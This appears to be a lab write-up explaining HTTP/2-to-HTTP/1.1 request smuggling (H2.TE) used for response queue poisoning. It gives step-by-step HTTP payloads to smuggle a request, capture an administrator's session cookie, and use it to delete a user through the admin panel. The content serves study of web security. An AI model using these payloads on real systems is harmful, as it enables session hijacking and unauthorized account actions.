# HTTP Request Smuggling - Response Queue Poisoning via H2.TE

## Concept


This vulnerability occurs when the front-end accepts **HTTP/2** requests and downgrades them to **HTTP/1.1** 
without properly handling the `Transfer-Encoding` header.



As a result, the attacker can smuggle an extra HTTP/1.1 request to the back-end.



Unlike previous request smuggling attacks, the goal here is **Response Queue Poisoning**. The attacker poisons the 
back-end response queue so that they can capture responses intended for another user (the admin).



---



## H2.TE



- **Client → Front-end:** HTTP/2

- **Front-end → Back-end:** HTTP/1.1

- The front-end incorrectly forwards the `Transfer-Encoding: chunked` header during HTTP/2 downgrading.



---



## Attack Flow



```

Attacker

    │

    ▼

HTTP/2 Request

(Transfer-Encoding: chunked)

    │

    ▼

Front-end downgrades to HTTP/1.1

    │

    ▼

Back-end processes the smuggled request

    │

    ▼

Response Queue becomes poisoned

    │

    ▼

Admin logs in

    │

    ▼

Admin's response remains in the queue

    │

    ▼
Attacker sends another request

    │

    ▼

Attacker receives the admin's response

```



---



## Step 1 - Confirm H2.TE



Add:



```http

Transfer-Encoding: chunked

```



without sending a chunked body.



Result:



```

500 Communication timed out

```



**Reason:**



The back-end receives the `Transfer-Encoding` header and waits for a chunked body that never arrives.



---



## Step 2 - Finish the Chunked Body



Send:



```http

POST / HTTP/2

Host: target

Transfer-Encoding: chunked



0

```



Result:



```

200 OK

```



The back-end now considers the request complete.



---



## Step 3 - Verify Request Smuggling



Smuggle an arbitrary prefix:



```http

POST / HTTP/2

Host: target

Transfer-Encoding: chunked



0



SMUGGLED

```




Every second request returns:



```

404 Not Found

```



This confirms that subsequent requests are appended to the smuggled prefix.



---



## Step 4 - Poison the Response Queue



Smuggle a complete HTTP/1.1 request:



```http

POST /x HTTP/2

Host: target

Transfer-Encoding: chunked



0



GET /x HTTP/1.1

Host: target



```



> **Important:** End the smuggled request with `\r\n\r\n`.



The endpoint `/x` does not exist, so it always returns **404**. This makes it easy to distinguish your own 
responses from captured responses.



---



## Step 5 - Capture the Admin's Response



1. Send the poisoning payload.

2. Wait about **5 seconds**.

3. Send the same payload again.

4. Repeat until you receive:



```http

302 Found

Set-Cookie: session=...

Location: /my-account?id=administrator

```



This response belongs to the admin.



---



## Step 6 - Access the Admin Panel



Use the stolen session:



```http

GET /admin HTTP/2

Cookie: session=<stolen-session>

```



Repeat until the server returns:



```

200 OK

```



---



## Step 7 - Delete Carlos



Find:



```

/admin/delete?username=carlos

```



Then send:



```http

GET /admin/delete?username=carlos HTTP/2

Cookie: session=<stolen-session>

```



---



## Why use `/x`?



The endpoint does not exist, so every legitimate response is:


```

404 Not Found

```



If you receive any other response (such as **302**), you know that you have successfully captured another user's 
response.



---



## Key Notes



- Use **HTTP/2**.

- Add `Transfer-Encoding: chunked`.

- `500 Timeout` indicates the back-end is waiting for a chunked body.

- Sending `0` terminates the chunked body.

- Response Queue Poisoning targets **responses**, not requests.

- The admin logs in automatically about every **15 seconds**.

- If the queue gets corrupted, send **10 normal requests** to reset the back-end connection.